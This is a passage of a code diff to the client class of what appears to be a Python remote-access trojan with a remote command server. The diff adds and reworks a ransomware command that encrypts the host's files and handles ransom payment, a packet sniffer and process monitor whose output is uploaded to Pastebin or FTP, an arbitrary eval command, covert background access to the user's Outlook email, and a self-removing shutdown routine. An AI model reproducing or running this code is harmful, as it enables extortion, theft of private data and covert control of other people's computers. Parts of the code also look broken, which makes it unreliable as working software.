+            return json.dumps(output)
+        except Exception as e:
+            return "{} error: '{}'".format(self._process_list.func_name, str(e))
+
+
+    def _process_search(self, arg):
+        try:
+            output  = {}
+            procs   = psutil.process_iter()
+            for p in procs:
+                if arg in str(p.name()):
+                    try:
+                        if len(json.dumps(output)) < 4096:
+                            output.update({str(p.pid).encode(): "{:>20} | {:>10}".format(str(p.name())[:19], str(p.status())).encode()})
+                        else:
+                            break
+                    except Exception as e:
+                        Client.debug(str(e))
+                        break
+            return json.dumps(output)
+        except Exception as e:
+            return "{} error: '{}'".format(self._process_search.func_name, str(e))
+
+
+    def _process_kill(self, arg):
+        try:
+            output  = {}
+            procs   = psutil.process_iter()
+            if str(arg).isdigit():
+                try:
+                    pr = psutil.Process(pid=int(arg))
+                    pr.kill()
+                    output.update({str(arg): "killed"})
+                except:
+                    output.update({str(arg): "not found"})
+            else:
+                procs = psutil.process_iter()
+                for p in procs:
+                    try:
+                        if str(arg) in str(p.name()):
+                            p.kill()
+                            output.update({str(p.name()): "killed"})
+                    except Exception as e:
+                        Client.debug(str(e))
+                return json.dumps(output)
+        except Exception as e:
+            return "{} error: '{}'".format(self._process_kill.func_name, str(e))
+
+
+    def _process_monitor(self, *args):
+        try:
+            self._jobs[self._process_monitor_log.func_name] = threading.Thread(target=self._process_monitor_log, name=time.time())
+            self._jobs[self._process_monitor_log.func_name].daemon = True
+            self._jobs[self._process_monitor_log.func_name].start()
+            if not len(self.process.buffer.getvalue()):
+                self.process.buffer.write("Time, User , Executable, PID, Privileges")
+            c = wmi.WMI()
+            process_watcher = c.Win32_Process.watch_for("creation")
+            while True:
+                try:
+                    new_process = process_watcher()
+                    proc_owner  = new_process.GetOwner()
+                    proc_owner  = "%s\\%s" % (proc_owner[0],proc_owner[2])
+                    create_date = new_process.CreationDate
+                    executable  = new_process.ExecutablePath
+                    pid         = new_process.ProcessId
+                    parent_pid  = new_process.ParentProcessId
+                    self.process.buffer.write('"%s", "%s", "%s", "%s", "%s"\n' % (create_date, proc_owner, executable, pid, parent_pid))
+                except: pass
+                if self._abort:
+                    break
+        except Exception as e:
+            return "{} error: '{}'".format(self._process_monitor.func_name, str(e))
+
+
+    def _process_logger(self):
+        try:
+            while True:
+                if self.process.buffer.tell() > self.process.max_bytes:
+                    try:
+                        task_id = self._task_id(self._process_monitor.func_name)
+                        result  = self._upload_pastebin(self.process.buffer) if 'ftp' not in args else self._Upload_ftp(self.process.buffer)
+                        self._results[task_id] = {'client_id': self._info['id'], 'session_id': self._session['id'], 'task': 'process monitor', 'data': result}
+                        self.process.buffer.reset()
+                    except Exception as e:
+                        self.debug("{} error: {}".format(self._process_logger.func_name, str(e)))
+                elif self._abort:
+                    break
+                else:
+                    time.sleep(5)
+        except Exception as e:
+            return "{} error: '{}'".format(self._process_monitor.func_name, str(e))
 
 
     # Private Methods
 
 
+    def _encrypt_file(self, filepath, key=None):
+        if os.path.isfile(filepath):
+            try:
+                with open(filepath, 'rb') as fp:
+                    plaintext = fp.read()
+                ciphertext = self._encrypt_data(plaintext, key) if key else self._encrypt_data(plaintext)
+                with open(filepath, 'wb') as fd:
+                    fd.write(ciphertext)
+                return filepath
+            except Exception as e:
+                return "{} error: {}".format(self._encrypt_file.func_name, str(e))
+        else:
+            return "File '{}' not found".format(filepath)
 
-    def _get_new_connection(self, host='127.0.0.1', port=1337):
+
+    def _decrypt_file(self, filepath, key=None):
+        if os.path.isfile(filepath):
+            try:
+                with open(filepath, 'rb') as fp:
+                    ciphertext = fp.read()
+                plaintext = self._decrypt_data(ciphertext) if not key else self._decrypt_data(ciphertext, key)
+                with open(filepath, 'wb') as fd:
+                    fd.write(plaintext)
+                return filepath
+            except Exception as e1:
+                return "{} error: {}".format(self._decrypt_file.func_name, str(e1))
+        else:
+            return "File '{}' not found".format(filepath)
+                                
+
+    def _encrypt_data(self, data, key=None):
         try:
-            if '__v__' not in dir(self):
-                host = self._get_remote_server()
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5.0)
-            s.connect((host, port))
-            self._session['connection'].set()
-            return s
+            if not key:
+                key = self._get_deobfuscated(self._session['key'])
+            return getattr(self, '_encrypt_{}'.format(self._system['encryption']))(data, key)
         except Exception as e:
-            self.debug("{} returned error: {}".format(self._get_new_connection.func_name, str(e)))
-        self.kill()
-        time.sleep(5)
-        return self.run() 
+            self.debug('{} error: {}'.format(self._encrypt_data.func_name, str(e)))
 
 
-    def _get_session_key(self):
+    def _decrypt_data(self, data, key=None):
         try:
-            g  = 2
-            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
-            a  = bytes_to_long(os.urandom(32))
-            xA = pow(g, a, p)
-            self._session['socket'].send(long_to_bytes(xA))
-            xB = bytes_to_long(self._session['socket'].recv(256))
-            x  = pow(xB, a, p)
-            y  = SHA256.new(long_to_bytes(x)).hexdigest()
-            return self._get_obfuscated(y)
+            if not key:
+                key = self._get_deobfuscated(self._session['key'])
+            return getattr(self, '_decrypt_{}'.format(self._system['encryption']))(data, key)
         except Exception as e:
-            self.debug("{} returned error: {}".format(self._get_session_key.func_name, str(e)))
-        self.kill()
-        time.sleep(5)
-        return self.run()
+            self.debug('{} error: {}'.format(self._decrypt_data.func_name, str(e)))
 
 
-    def _encrypt(self, data, key=None):
-        if not key:
-            key = self._get_deobfuscated(self._session['key'])
-        return getattr(self, '_encrypt_{}'.format(self._info['encryption']))(data, key)
-
-
-    def _decrypt(self, data, key=None):
-        if not key:
-            key = self._get_deobfuscated(self._session['key'])
-        return getattr(self, '_decrypt_{}'.format(self._info['encryption']))(data, key)
-
-
-    def _send(self, **kwargs):
+    def _server_send(self, **kwargs):
         self._session['connection'].wait()
         try:
             text = json.dumps(kwargs)
-            data = self._encrypt(text)
+            data = self._encrypt_data(text)
             self._session['socket'].sendall(data + '\n')
         except Exception as e:
-            self.debug('{} error: {}'.format(self._send.func_name, str(e)))
+            self.debug('{} error: {}'.format(self._server_send.func_name, str(e)))
 
 
-    def _recv(self):
+    def _server_recv(self):
         data = ''
         while '\n' not in data:
             try:
@@ -1246,10 +1415,41 @@ class Client(object):
                 break
         if data and len(bytes(data)):
             try:
-                text = self._decrypt(bytes(data).rstrip())
+                text = self._decrypt_data(bytes(data).rstrip())
                 return json.loads(text)
             except Exception as e:
-                self.debug('{} error: {}'.format(self._recv.func_name, str(e)))
+                self.debug('{} error: {}'.format(self._server_recv.func_name, str(e)))
+
+
+    def _server_prompt(self):
+        try:
+            while True:
+                if not self._abort:
+                    self._session['prompt'].wait()
+                    self._server_send(**{'id': '0' * 64, 'client_id': self._system['id'], 'session_id': self._session['id'], 'task': 'prompt', 'data': '[{} @ %s]> ' % os.getcwd()})
+                    self._session['prompt'].clear()
+                else:
+                    break
+            self.kill()
+            return self.run()
+        except Exception as e:
+            self.debug("{} error: {}".format(self._server_prompt.func_name, str(e)))
+            
+ 
+    def _server_connect(self, host='127.0.0.1', port=1337):
+        try:
+            if not Client._debug:
+                host = self._get_remote_server()
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(5.0)
+            s.connect((host, port))
+            self._session['connection'].set()
+            return s
+        except Exception as e:
+            self.debug("{} error: {}".format(self._server_connect.func_name, str(e)))
+        self.kill()
+        time.sleep(5)
+        return self.run() 
 
 
     @config(flag=threading.Event())
@@ -1289,34 +1489,19 @@ class Client(object):
                 except:
                     break
         except Exception as e:
-            self.debug("{} returned error: {}".format(self._task_threader.func_name, str(e)))
+            self.debug("{} error: {}".format(self._task_threader.func_name, str(e)))
 
-
-    def _get_shell_prompt(self):
-        try:
-            while True:
-                if not self._abort:
-                    self._session['prompt'].wait()
-                    self._send(**{'id': '0' * 64, 'client_id': self._info['id'], 'session_id': self._session['id'], 'task': 'prompt', 'data': '[{} @ %s]> ' % os.getcwd()})
-                    self._session['prompt'].clear()
-                else:
-                    break
-            self.kill()
-            return self.run()
-        except Exception as e:
-            self.debug("{} returned error: {}".format(self._get_shell_prompt.func_name, str(e)))
-
-            
+           
     def _get_task_id(self, task):
         try:
-            return SHA256.new(self._info['id'] + str(task) + str(time.time())).hexdigest()
+            return SHA256.new(self._system['id'] + str(task) + str(time.time())).hexdigest()
         except Exception as e:
-            self.debug("{} returned error: {}".format(self._get_task_id.func_name, str(e)))
+            self.debug("{} error: {}".format(self._get_task_id.func_name, str(e)))
 
 
     def _get_session_id(self):
         try:
-            self._session['socket'].sendall(self._encrypt(json.dumps(self._info)) + '\n')
+            self._session['socket'].sendall(self._encrypt_data(json.dumps(self._system)) + '\n')
             buf = ""
             while '\n' not in buf:
                 try:
@@ -1325,7 +1510,7 @@ class Client(object):
                     self.debug('Waiting for Session ID...')
                     continue
             if buf and len(bytes(buf)):
-                session_id = self._decrypt(buf.rstrip()).rstrip()
+                session_id = self._decrypt_data(buf.rstrip()).rstrip()
                 if len(str(session_id)) == SHA256.block_size:
                     self.debug("Session ID: {}".format(session_id))
                     return session_id
@@ -1334,8 +1519,26 @@ class Client(object):
                     time.sleep(5)
                     return self.run()
         except Exception as e:
-            self.debug("{} returned error: {}".format(self._get_session_id, str(e)))
+            self.debug("{} error: {}".format(self._get_session_id, str(e)))
 
+
+    def _get_session_key(self):
+        try:
+            g  = 2
+            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
+            a  = bytes_to_long(os.urandom(32))
+            xA = pow(g, a, p)
+            self._session['socket'].send(long_to_bytes(xA))
+            xB = bytes_to_long(self._session['socket'].recv(256))
+            x  = pow(xB, a, p)
+            y  = SHA256.new(long_to_bytes(x)).hexdigest()
+            return self._get_obfuscated(y)
+        except Exception as e:
+            self.debug("{} error: {}".format(self._get_session_key.func_name, str(e)))
+        self.kill()
+        time.sleep(5)
+        return self.run()
+    
 
     def _get_standby_mode(self):
         try:
@@ -1363,7 +1566,7 @@ class Client(object):
         try:
             raw_buffer  = ""
             attempt     = 1
-            self._session['socket'].sendall(self._encrypt(json.dumps({"request":"public_key"})) + '\n')
+            self._session['socket'].sendall(self._encrypt_data(json.dumps({"request":"public_key"})) + '\n')
             while "\n" not in raw_buffer:
                 try:
                     raw_buffer += self._session['socket'].recv(1024)
@@ -1375,37 +1578,42 @@ class Client(object):
                     else:
                         break
             if raw_buffer and len(str(raw_buffer)):
-                key = self._decrypt(str(raw_buffer))
+                key = self._decrypt_data(str(raw_buffer))
                 rsa = RSA.importKey(key)
-                self.debug("RSA Public Key:\n{}".format(str(key)))
+                self.debug(str(key))
                 return rsa
         except Exception as e:
-            self.debug("{} returned error: {}".format(str(e)))
+            self.debug("{} error: {}".format(str(e)))
         self.debug("Invalid RSA Public Key: {}\nRestarting in 5 seconds...".format(str(raw_buffer)))
         self.kill()
         time.sleep(5)
         return self.run()
 
 
-    def _get_new_wallet(self):
+    def _get_packets(self, **kwargs):
+        seconds = kwargs.get('seconds') if kwargs.get('seconds') else 30
+        mode    = kwargs.get('mode') if kwargs.get('mode') else 'pastebin'
+        limit   = time.time() + seconds
+        sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+        while time.time() < limit:
+            try:
+                recv_data = sniffer_socket.recv(2048)
+                recv_data, ip_bool = self._packetsniffer_eth_header(recv_data)
+                if ip_bool:
+                    recv_data, ip_proto = self._packetsniffer_ip_header(recv_data)
+                    if ip_proto == 6:
+                        recv_data = self._packetsniffer_tcp_header(recv_data)
+                    elif ip_proto == 17:
+                        recv_data = self._packetsniffer_udp_header(recv_data)
+            except: break
         try:
-            api_key         = getattr(Client._ransom_payment, 'api_key')
-            api_secret      = getattr(Client._ransom_payment, 'api_secret')
-            api_version     = getattr(Client._ransom_payment, 'api_version')
-            account_id      = getattr(Client._ransom_payment, 'account_id')
-            timestamp       = bytes(int(time.time()))
-            name            = bytes(self._session.get('id'))
-            url             = bytes('https://api.coinbase.com/v2/accounts/{}/addresses'.format(account_id))
-            data            = bytes(urllib.urlencode({'name': name}))
-            path            = bytes(urllib2.urlparse.urlparse(url)[2])
-            message         = bytes(timestamp + 'POST' + path + data)
-            signature       = bytes(HMAC.new(api_secret, msg=message, digestmod=SHA256).hexdigest())
-            request         = urllib2.Request(url, data=data)
-            request.headers = {'Content-Type': 'application/json','CB-VERSION': api_version,'CB-ACCESS-KEY': api_key,'CB-ACCESS-SIGN': signature,'CB-ACCESS-TIMESTAMP': timestamp}
-            return json.loads(urllib2.urlopen(request).read())['data']['address'].encode()
+            sniffer_socket.close()
+        except: pass
+        try:
+            output = cStringIO.StringIO('\n'.join(self.packetsniffer.capture))
+            result = self._upload_pastebin(output) if 'ftp' not in mode else self._upload_ftp(output, filetype='.pcap')
         except Exception as e:
-            self.debug("{} returned error: {}".format(self._get_new_wallet.func_name, str(e)))
-
+            self.debug("packetsniffer manager error: {}".format(str(e)))
 
 
     # Public Methods
@@ -1423,7 +1631,7 @@ class Client(object):
             else:
                 return os.chdir('.')
         except Exception as e:
-            return "{} returned error: '{}'".format(self.cd.func_name, str(e))            
+            return "{} error: '{}'".format(self.cd.func_name, str(e))            
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
@@ -1434,59 +1642,23 @@ class Client(object):
         try:
             return '\n'.join(os.listdir(path)) if os.path.isdir(path) else 'Error: path not found'
         except Exception as e2:
-            return "{} returned error: {}".format(self.ls.func_name, str(e2))
+            return "{} error: {}".format(self.ls.func_name, str(e2))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='ps [args]')
     def ps(self, args=None):
         """
-        list, search, kill processes
+        alias for 'process'
         """
-        try:
-            output = {}
-            process_list = psutil.process_iter()
-            if not args:
-                for p in process_list:
-                    try:
-                        if len(json.dumps(output)) < 2048:
-                            output.update({str(p.pid).encode(): "{:>20} | {:>10}".format(str(p.name())[:19], str(p.status())).encode()})
-                        else:
-                            break
-                    except Exception as e:
-                        Client.debug(str(e))
-                        break
-            else:
-                cmd, _, arg  = str(args).partition(' ')
-                if 'search' in cmd:
-                    for p in process_list:
-                        if arg in str(p.name()):
-                            try:
-                                if len(json.dumps(output)) < 2048:
-                                    output.update({str(p.pid).encode(): "{:>20} | {:>10}".format(str(p.name())[:19], str(p.status())).encode()})
-                                else:
-                                    break
-                            except Exception as e:
-                                Client.debug(str(e))
-                                break
-                elif 'kill' in cmd or 'terminate' in cmd:
-                    if str(arg).isdigit():
-                        try:
-                            pr = psutil.Process(pid=int(arg))
-                            pr.kill()
-                            output.update({str(arg): "killed"})
-                        except:
-                            output.update({str(arg): "not found"})
-                    else:
-                        for p in process_list:
-                            try:
-                                if str(cmd) in str(p.name()):
-                                    p.kill()
-                                    output.update({str(p.name()): "killed"})
-                            except Exception as e:
-                                Client.debug(str(e))
-            return json.dumps(output)
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.ps.func_name, str(e))
+        if not args:
+            return self.ps.usage
+        else:
+            cmd, _, action = str(args).partition(' ')
+            if hasattr(self, '_process_%s' % cmd):
+                try:
+                    return getattr(self, '_process_%s' % cmd)(action)
+                except Exception as e2:
+                    return "{} error: {}".format(self.ps.func_name, str(e2))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
@@ -1495,9 +1667,9 @@ class Client(object):
         show name of present working directory
         """
         try:
-            return '\n\n' + os.getcwd()
+            return os.getcwd()
         except Exception as e:
-            return "{} returned error: '{}'".format(self.pwd.func_name, str(e))
+            return "{} error: '{}'".format(self.pwd.func_name, str(e))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
@@ -1509,7 +1681,7 @@ class Client(object):
             output = ""
             if not os.path.isfile(path):
                 return "Error: file not found"
-            target = open(path, 'r')
+            target = open(path, 'rb')
             while True:
                 try:
                     line = target.readline().rstrip()
@@ -1519,7 +1691,7 @@ class Client(object):
                 except: break
             return output
         except Exception as e:
-            return "{} returned error: '{}'".format(self.cat.func_name, str(e))        
+            return "{} error: '{}'".format(self.cat.func_name, str(e))        
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='set <cmd> [key=value]')
@@ -1554,29 +1726,44 @@ class Client(object):
             else:
                 return "Target attribute '{}' not found".format(str(target))
         except Exception as e:
-            return "{} returned error: '{}'".format(self.set.func_name, str(e))
+            return "{} error: '{}'".format(self.set.func_name, str(e))
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
+    def eval(self, code):
+        """
+        execute Python code in current context
+        """
+        try:
+            return eval(code)
+        except Exception as e:
+            return "eval('{}') failed with error: {}".format(str(code), str(e))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
     def wget(self, url, filename=None):
         """
-        download file from url
+        download file from url and return path name
         """
         if url.startswith('http'):
             try:
-                path, _ = urllib.urlretrieve(url, filename)
+                path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
                 return path
             except Exception as e:
-                return "'{}' returned error: '{}'".format(self.wget.func_name, str(e))
+                return "{} error: {}".format(self.wget.func_name, str(e))
         else:
-            return 'Invalid target URL (must begin with http)'
+            return "Invalid target URL - must begin with 'http'"
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
     def kill(self):
         """
-        shutdown the current connection
+        shutdown the current connection and reset session
         """
+        try:
+            self._session['connection'] = threading.Event()
+            self._session['prompt'] = threading.Event()
+        except: pass
         try:
             self._session.get('socket').close()
         except: pass
@@ -1593,27 +1780,34 @@ class Client(object):
             self._session['socket']      = None
             self._session['public_key']  = None
             self._session['private_key'] = None
-            self._session['connection']  = threading.Event()
         except Exception as e:
-            self.debug("{} returned error: {}".format(self.kill.func_name, str(e)))
-        jobs = self._jobs.keys()
-        for job in jobs:
-            try:
-                _ = self._jobs.pop(job, None)
-                del _
-            except: pass
+            self.debug("{} error: {}".format(self.kill.func_name, str(e)))
+        try:
+            jobs = self._jobs.keys()
+            for job in jobs:
+                self.stop(job)
+        except Exception as e:
+            self.debug("{} error: {}".format(self.kill.func_name, str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='help')
-    def help(self):
+    def help(self, cmd=None):
         """
         list commands with usage information
         """
-        try:
-            return json.dumps({self._commands[cmd]["usage"].encode(): self._commands[cmd]['description'].encode() for cmd in self._commands})
-        except Exception as e:
-            self.debug("{} returned error: {}".format(self.help.func_name, str(e)))
+        if not cmd:
+            try:
+                return json.dumps({self._commands[c]['usage']: self._commands[c]['description'] for c in self._commands})
+            except Exception as e1:
+                self.debug("{} error: {}".format(self.help.func_name, str(e1)))
+        elif hasattr(self, str(cmd)):
+            try:
+                return json.dumps({self._commands[cmd]['usage']: self._commands[cmd]['description']})
+            except Exception as e2:
+                self.debug("{} error: {}".format(self.help.func_name, str(e2)))
 
+
+    
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
     def show(self, attribute):
@@ -1625,7 +1819,9 @@ class Client(object):
             if 'jobs' in attribute:
                 return json.dumps({a: self._get_job_status(self._jobs[a].name) for a in self._jobs if self._jobs[a].is_alive()})
             elif 'privileges' in attribute:
-                return json.dumps({'username': self._info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
+                return json.dumps({'username': self._system.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
+            elif 'info' in attribute:
+                return json.dumps(self._system)
             elif hasattr(self, attribute):
                 try:
                     return json.dumps(getattr(self, attribute))
@@ -1643,13 +1839,13 @@ class Client(object):
             else:
                 return self.show.usage
         except Exception as e:
-            return "'{}' returned error: '{}'".format(self._jobs.func_name, str(e))
+            return "'{}' error: '{}'".format(self._jobs.func_name, str(e))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
     def stop(self, target):
         """
-        stop a currently running job
+        stop a running job
         """
         try:
             if target in self._jobs:
@@ -1659,19 +1855,35 @@ class Client(object):
             else:
                 return "Job '{}' not found".format(target)
         except Exception as e:
-            return "{} returned error: '{}'".format(self.stop.func_name, str(e))
+            return "{} error: '{}'".format(self.stop.func_name, str(e))
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='scan <host>')
-    def scan(self, *args):
+    def scan(self, args):
         """
         scan host/network for online hosts and open ports
         """
         try:
-            host = [i for i in args if self._get_if_ipv4(i)][0] if len([i for i in args if self._get_if_ipv4(i)]) else self._info.get('local')
+            args = str(args).split()
+            host = [i for i in args if self._get_if_ipv4(i)][0] if len([i for i in args if self._get_if_ipv4(i)]) else self._system.get('local')
             return self._scan_network(host) if 'network' in args else self._scan_host(host)
         except Exception as e:
-            return "{} returned error: '{}'".format(self.scan.func_name, str(e))        
+            return "{} error: '{}'".format(self.scan.func_name, str(e))        
+
+
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
+    def unzip(self, path):
+        """
+        unzip a compressed archive/file
+        """
+        if os.path.isfile(path):
+            try:
+                _ = zipfile.ZipFile(path).extractall('.')
+                return os.path.splitext(path)[0]
+            except Exception as e:
+                return "{} error: '{}'".format(self.unzip.func_name, str(e))
+        else:
+            return "File '{}' not found".format(path)
 
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
@@ -1694,7 +1906,7 @@ class Client(object):
                         try:
                             remove = getattr(self, '_persistence_remove_{}'.format(method))()
                         except Exception as e2:
-                            self.debug("Error removing persistence method '{}': {}".format(method, str(e2)))
+                            self.debug("{} error: {}".format(method, str(e2)))
             try:
                 os.remove(__file__)
             except: pass
@@ -1714,139 +1926,81 @@ class Client(object):
             _shutdown = lambda: os.popen('shutdown /f /p' if os.name is 'nt' else 'shutdown -f').read()
             shutdown = threading.Timer(1, _shutdown)
             shutdown.start()
-            sys.exit()
-            
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
-    def unzip(self, path):
-        """
-        unzip a compressed archive/file
-        """
-        if os.path.isfile(path):
-            try:
-                return zipfile.ZipFile(path).extractall('.')
-            except Exception as e:
-                return "{} returned error: '{}'".format(self.unzip.func_name, str(e))
-        else:
-            return "File '{}' not found".format(path)
+            self.ps('kill python')
+            sys.exit() if not Client._debug else exit()
 
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='standby')
-    def standby(self):
+    @config(platforms=['win32','darwin'], command=True, usage='email <option>')
+    def email(self, args):
         """
-        disconnect from server but keep client alive
-        """
+        access user's Outlook email in the background without opening it or prompting user
+        """       
+        mode, _, arg   = str(args).partition(' ')
         try:
-            self._jobs[self.standby.func_name] = threading.Timer(1.0, self._get_standby_mode)            
-            self._jobs[self.standby.func_name].start()
-            return "{} standing by".format(self._info.get('ip'))
-        except Exception as e:
-            return "{} returned error: '{}'".format(self.standby.func_name, str(e))
-
-    @config(platforms=['win32','linux2','darwin'], mode=None, command=True, usage='encrypt <file>')
-    def encrypt(self, filepath, key=None):
-        """
-        encrypt the target file
-        """
-        if os.path.isfile(filepath):
-            try:
-                with open(filepath, 'rb') as fp:
-                    plaintext = fp.read()
-                ciphertext = self._encrypt(plaintext, key) if key else self._encrypt(plaintext)
-                with open(filepath, 'wb') as fd:
-                    fd.write(ciphertext)
-                return filepath
-            except Exception as e:
-                return "{} returned error: {}".format(self.encrypt.func_name, str(e))
-        else:
-            return "File '{}' not found".format(filepath)
+            if not Outlook.installed():
+                return "Outlook application could not be found"
+            if not getattr(self, '_email'):
+                self._email = Outlook()
+            if not hasattr(self._email, mode):
+                return Outlook.help()
+            else:
+                return getattr(self._email, mode)(arg)
+        except Exception as e2:
+            self.debug("{} error: {}".format(self.email.func_name, str(e2)))
 
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='decrypt <file>')
-    def decrypt(self, filepath, key=None):
-        """
-        decrypt the target file
-        """
-        if os.path.isfile(filepath):
-            try:
-                with open(filepath, 'rb') as fp:
-                    ciphertext = fp.read()
-                plaintext = self._decrypt(ciphertext) if not key else self._decrypt(ciphertext, key)
-                with open(filepath, 'wb') as fd:
-                    fd.write(plaintext)
-                return filepath
-            except Exception as e1:
-                return "{} returned error: {}".format(self.decrypt.func_name, str(e1))
-        else:
-            return "File '{}' not found".format(filepath)
-
-
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='ransom <file/path>')
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='ransom <mode> [path]')
     def ransom(self, args):
         """
         encrypt host files and hold decryption key for ransom
         """
-        path, _, port = str(args).partition(' ')
-        if not path or path == 'all':
-            path = '/'
-        if not port:
-            return self.ransom.usage
-        elif not port.isdigit():
-            return "Error: port number must be an integer"
-        elif not os.path.exists(path):
-            return "Error: file/directory not found"
-        elif not self._session.get('public_key'):
-            return "Error: RSA public key not found"
-        else:
-            s = socket.socket()
-            s.connect((self._session['socket'].getpeername()[0], int(port)))
-            if os.path.isfile(path):
-                self._ransom_encrypt((path, s))
-            elif os.path.isdir(path):
-                self._jobs["ransom-tree-walk"] = threading.Thread(target=os.path.walk, args=(path, lambda _, d, f: [self._tasks.put_nowait((self._ransom_encrypt, (os.path.join(d, ff), s))) for ff in f], None), name=time.time())
-                self._jobs["ransom-tree-walk"].start()
-                for i in range(10):
-                    self._jobs["ransom-%d" % i] = threading.Thread(target=self._task_threader, name=time.time())
-                    self._jobs["ransom-%d" % i].daemon = True
-                    self._jobs["ransom-%d" % i].start()
-                for job in self._jobs:
-                    if self.ransom.func_name in job:
-                        if self._jobs[job].is_alive():
-                            self._jobs[job].join()
-            return "Ransom process completed"
+        try:
+            if not args:
+                return self.ransom.usage
 
+            cmd, _, action = str(args).partition(' ')
+            
+            if 'payment' in cmd:
+                return self._ransom_payment(self._session['id'])
+            
+            elif 'decrypt' in cmd:
+                try:
+                    if 'private_key' not in self._session:
+                        request  = json.dumps({"request": "private_key"})
+                        task_id  = self._get_task_id(self.ransom.func_name)
+                        task     = {'id': task_id, 'client_id': self._system['id'], 'session_id': self._session['id'], 'task': self.restore.func_name, 'data': request}
+                        self._server_send(**task)
+                        task     = self._server_recv()
+                        data     = task.get('data')
+                        self._session['private_key'] = RSA.importKey(data)
+                    for task_id in self._results:
+                        if 'ransom' in self._results[task_id]['task'] and path in ('/', self._results[task_id]['data']['file_path']):
+                            self._tasks.put_nowait((self._ransom_decrypt, task_id))
+                    for n in range(10):
+                        self._jobs["restore-%d" % n] = threading.Thread(target=self._task_threader, name=time.time())
+                        self._jobs["restore-%d" % n].daemon = True
+                        self._jobs["restore-%d" % n].start()
+                    return "Decrypting files..."
+                except Exception as e:
+                    return "{} error: '{}'".format(self.restore.func_name, str(e))
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='restore <path/all>')
-    def restore(self, path=None):
-        """
-        restore encrypted files after user pays the ransom
-        """
-        if path and not os.path.exists(str(path)):
-            return "Error: '{}' not found".format(str(path))
-        path    = 'all' if not path else str(path)
-        task_id = SHA256.new(self._session['id'] + self.ransom.func_name + str(int(time.time()))).hexdigest()
-        task    = {'id': task_id, 'client_id': self._info['id'], 'session_id': self._session['id'], 'task': self.restore.func_name, 'data': 'restore %s' % path}
-        self._send(**task)
-        task = self.recv()
-        self._session['private_key'] = RSA.importKey(task['data'])
-        for task_id, task in self._results.items():
-            if 'ransom' in task['task']:
-                if path in ('all', task['data']['file']):
-                    self._tasks.put_nowait((self._ransom_decrypt, path))
-        num = int(self._tasks.qsize()/10)
-        if num > 10:
-            num = 10
-        elif num < 1:
-            num = 1
-        for n in range(num):
-            self._jobs["restore-%d" % n] = threading.Thread(target=self._task_threader, name=time.time())
-            self._jobs["restore-%d" % n].daemon = True
-            self._jobs["restore-%d" % n].start()
-        for job in self._jobs:
-            if self.restore.func_name in job:
-                if self._jobs[job].is_alive():
-                    self._jobs[job].join()
-        return "Restoration complete"
+            elif 'encrypt' in cmd:
+                if os.path.isfile(action):
+                    self._ransom_encrypt(cmd)
+                elif os.path.isdir(cmd):
+                    self._jobs["ransom-walk-path"] = threading.Thread(target=self._ransom_iter, name=time.time())
+                    self._jobs["ransom-tree-walk"].daemon = True
+                    self._jobs["ransom-tree-walk"].start()
+                    for i in range(10 if int(self._tasks.unfinished_tasks/10) > 10 else int(self._tasks.unfinished_tasks/10)):
+                        self._jobs["ransom-%d" % i] = threading.Thread(target=self._task_threader, name=time.time())
+                        self._jobs["ransom-%d" % i].daemon = True
+                        self._jobs["ransom-%d" % i].start()
+                self._jobs[self._ransom_payment.func_name] = threading.Thread(target=self._ransom_payment, name=time.time())
+                self._jobs[self._ransom_payment.func_name].daemon = True
